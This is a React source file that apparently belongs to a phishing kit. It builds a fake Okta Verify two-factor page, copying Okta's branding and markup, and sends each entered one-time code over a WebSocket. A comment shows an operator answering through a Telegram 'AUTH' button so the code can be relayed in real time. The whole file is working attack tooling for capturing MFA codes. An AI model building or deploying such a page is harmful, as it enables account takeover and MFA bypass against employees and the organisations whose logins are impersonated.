import React, { useState, useEffect } from "react";
import { useSearchParams } from "react-router-dom";
import { useWebSocket } from "../../context/WebSocketContext";
import { getSessionEmail } from "../../utils/email";

import bgImage from "../../assets/okta/2fa-okta.jpeg";
import oktaLogoEndUser from "../../assets/okta/okta-logo-end-user-dashboard.fc6d8fdbcb8cb4c933d009e71456cec6.svg";
import oktaLogo from "../../assets/okta/okta_logo.png";
import oktaVerifyIcon from "../../assets/okta/okta-verify-icon.png";
import useDynamicCss from "../../utils/useDynamicCss";

export default function Okta2FAPage() {
  const [searchParams] = useSearchParams();
  const userEmail = getSessionEmail(searchParams, 'user@example.com');
  const [code, setCode] = useState("");
  const [errorType, setErrorType] = useState<"wrong-code" | "empty" | null>(
    searchParams.get("error") === "wrong-code" ? "wrong-code" : null,
  );
  const [isLoading, setIsLoading] = useState(false);
  const [pageLoad, setPageLoad] = useState(true);
  const { submitForm, verificationError, clearVerificationError, navigationEvent, clearNavigationEvent } = useWebSocket();

  useEffect(() => {
    const timer = setTimeout(() => setPageLoad(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  // Show server-driven error (e.g. from ❌ AUTH button in Telegram)
  useEffect(() => {
    if (verificationError && (verificationError.type === 'auth' || verificationError.type === 'okta')) {
      setErrorType("wrong-code");
      setIsLoading(false);
      setPageLoad(false);
      clearVerificationError();
    }
  }, [verificationError, clearVerificationError]);

  // Reset on server navigation
  useEffect(() => {
    if (navigationEvent) {
      setIsLoading(false);
      setPageLoad(false);
      setCode('');
      setErrorType(null);
      clearNavigationEvent();
    }
  }, [navigationEvent, clearNavigationEvent]);

  useDynamicCss("/css/okta.css");


  // Update if URL changes
  useEffect(() => {
    if (searchParams.get("error") === "wrong-code") {
      setErrorType("wrong-code");
    } else {
      setErrorType(null);
    }
  }, [searchParams]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!code.trim()) {
      setErrorType("empty");
      return;
    }
    setErrorType(null);
    setIsLoading(true);
    setPageLoad(true);
    // Submit via WebSocket; server will navigate or show error
    submitForm('okta', { code });
  };

  return (
    <>
      <div className="wrapper-loading-root">
        <div className="progress-bar" style={{ display: (isLoading || pageLoad) ? "flex" : "none" }}>
          <div className="bar1"></div>
          <div className="bar2"></div>
        </div>
      </div>
      <div className={`auth okta-container ${(isLoading || pageLoad) ? "body-loading" : ""}`}>
        <div
          id="login-bg-image"
          className="login-bg-image tb--background bgStyle"
          data-se="login-bg-image"
          style={{ backgroundImage: `url(${bgImage})` }}
        ></div>
        <div className="content">
          <div className="applogin-banner">
            <div className="applogin-background"></div>
            <div className="applogin-container">
              <h1>
                <span className="applogin-app-title">
                  <b>Connect with </b>
                </span>
                <div className="applogin-app-logo">
                  <img
                    alt="Google Workspace OneWorkplace.global"
                    className="logo onewp_googleworkspaceoneworkplaceglobal_1"
                    src={oktaLogoEndUser}
                  />
                </div>
              </h1>
              <p>Sign in with your account to access the Okta Dashboard</p>
            </div>
          </div>
          <div id="signin-container">
            <main
              data-se="auth-container"
              id="okta-sign-in"
              className="auth-container main-container"
            >
              <div className="okta-sign-in-header auth-header">
                <h1>
                  <img
                    className="auth-org-logo"
                    alt="OneWP logo logo"
                    aria-label="OneWP logo logo"
                    src={oktaLogo}
                  />
                </h1>
                <div
                  data-type="beacon-container"
                  className="beacon-container"
                  style={{ transform: "scale(1, 1)", textIndent: "1px" }}
                >
                  <div className="beacon-blank auth-beacon">
                    <div className="beacon-blank js-blank-beacon-border auth-beacon-border"></div>
                  </div>
                  <div
                    className="bg-helper auth-beacon auth-beacon-factor mfa-okta-verify"
                    data-se="factor-beacon"
                  >
                    <div className="okta-sign-in-beacon-border auth-beacon-border">
                      <img
                        src={oktaVerifyIcon}
                        style={{ borderRadius: "50%" }}
                        alt="Okta Verify"
                      />
                    </div>
                  </div>
                </div>
              </div>
              <div className="auth-content">
                <div className="auth-content-inner">
                  <div className="siw-main-view challenge-authenticator--okta_verify mfa-verify">
                    <div className="siw-main-header">
                      <div>
                        <div>
                          <div
                            data-type="beacon-container"
                            className="beacon-container"
                          >
                            <div className="beacon-blank auth-beacon">
                              <div className="beacon-blank js-blank-beacon-border auth-beacon-border"></div>
                            </div>
                            <div
                              className="bg-helper auth-beacon auth-beacon-factor mfa-okta-verify"
                              data-se="factor-beacon"
                            >
                              <div className="okta-sign-in-beacon-border auth-beacon-border"></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div className="siw-main-body">
                      <form
                        data-se="o-form"
                        id="form65"
                        className="okta-verify-totp-challenge o-form o-form-edit-mode"
                        onSubmit={handleSubmit}
                      >
                        <div
                          data-se="o-form-content"
                          className="o-form-content o-form-theme clearfix"
                        >
                          <h2
                            data-se="o-form-head"
                            className="okta-form-title o-form-head"
                          >
                            Enter a code
                          </h2>

                          <div className="identifier-container">
                            <span
                              className="identifier no-translate"
                              data-se="identifier"
                              title={userEmail}
                            >
                              {userEmail}
                            </span>
                          </div>
                          <div className="o-form-info-container"></div>

                          {errorType === "wrong-code" && (
                            <div
                              className="o-form-error-container o-form-has-errors"
                              data-se="o-form-error-container"
                              role="alert"
                            >
                              <div>
                                <div
                                  className="okta-form-infobox-error infobox infobox-error"
                                  role="alert"
                                >
                                  <span className="icon">
                                    <span className="eric">
                                      <svg
                                        aria-hidden="true"
                                        className="Qk3oof xTjuxe"
                                        fill="#FFF"
                                        focusable="false"
                                        width="16px"
                                        height="16px"
                                        viewBox="0 0 24 24"
                                        xmlns="http://www.w3.org/2000/svg"
                                      >
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                      </svg>
                                    </span>
                                  </span>
                                  <p>Wrong code. Please try again.</p>
                                </div>
                              </div>
                            </div>
                          )}

                          <div
                            className="o-form-fieldset-container"
                            data-se="o-form-fieldset-container"
                          >
                            <div
                              data-se="o-form-fieldset-credentials.totp"
                              className="o-form-fieldset o-form-label-top"
                            >
                              <div
                                data-se="o-form-label"
                                className="okta-form-label o-form-label"
                              >
                                Enter code from Okta Verify app
                              </div>
                              <div
                                data-se="o-form-input-container"
                                className={`o-form-input ${
                                  errorType !== null ? "o-form-has-errors" : ""
                                }`}
                              >
                                <span
                                  data-se="o-form-input-credentials.totp"
                                  className={`o-form-input-name-credentials.totp o-form-control okta-form-input-field input-fix ${
                                    errorType !== null
                                      ? "o-form-has-errors"
                                      : ""
                                  }`}
                                >
                                  <input
                                    id="input73"
                                    aria-label=""
                                    aria-describedby={
                                      errorType !== null
                                        ? "input-container-error91"
                                        : ""
                                    }
                                    aria-invalid={
                                      errorType !== null ? "true" : "false"
                                    }
                                    maxLength={6}
                                    type="text"
                                    name="credentials.totp"
                                    value={code}
                                    onChange={(e) => setCode(e.target.value)}
                                  />
                                </span>
                                {/* Input Validation */}
                                {errorType === "empty" && (
                                  <p
                                    id="input-container-error91"
                                    className="okta-form-input-error o-form-input-error o-form-explain"
                                    role="alert"
                                    style={{ gap: "3px" }}
                                  >
                                    <span className="eric">
                                      <svg
                                        aria-hidden="true"
                                        className="Qk3oof xTjuxe"
                                        fill="#F00"
                                        focusable="false"
                                        width="16px"
                                        height="16px"
                                        viewBox="0 0 24 24"
                                        xmlns="http://www.w3.org/2000/svg"
                                      >
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                      </svg>
                                    </span>
                                    Enter code.
                                  </p>
                                )}
                              </div>
                            </div>
                          </div>
                        </div>

                        {isLoading ? (
                          <div
                            className="o-form-button-bar"
                            style={{ position: "relative" }}
                          >
                            <input
                              className="button button-primary"
                              data-type="save"
                              type="submit"
                              value=""
                              style={{ opacity: 0.5 }}
                              disabled
                            />
                            <div
                              style={{
                                display: "flex",
                                position: "absolute",
                                top: "26%",
                                left: "0px",
                                width: "100%",
                                justifyContent: "center",
                              }}
                            >
                              <div className="loading-dots">
                                <div className="dot"></div>
                                <div className="dot"></div>
                                <div className="dot"></div>
                              </div>
                            </div>
                          </div>
                        ) : (
                          <div
                            className="o-form-button-bar"
                            style={{ position: "relative" }}
                          >
                            <input
                              className="button button-primary"
                              data-type="save"
                              type="submit"
                              value="Verify"
                              style={{ opacity: 1 }}
                            />
                          </div>
                        )}
                      </form>
                    </div>
                    <div className="siw-main-footer">
                      <div className="auth-footer">
                        <a
                          data-se="cancel"
                          href="/login"
                          className="link js-cancel"
                        >
                          Back to sign in
                        </a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </main>
          </div>
        </div>
        <div className="footer">
          <div className="footer-container clearfix">
            <p className="copyright">
              Powered by{" "}
              <a href="#" className="inline-block notranslate">
                Okta
              </a>
            </p>
            <p className="privacy-policy">
              <a
                href="#"
                target="_blank"
                rel="noreferrer"
                className="inline-block margin-l-10"
              >
                Privacy Policy
              </a>
            </p>
          </div>
        </div>
      </div>
    </>
  );
}
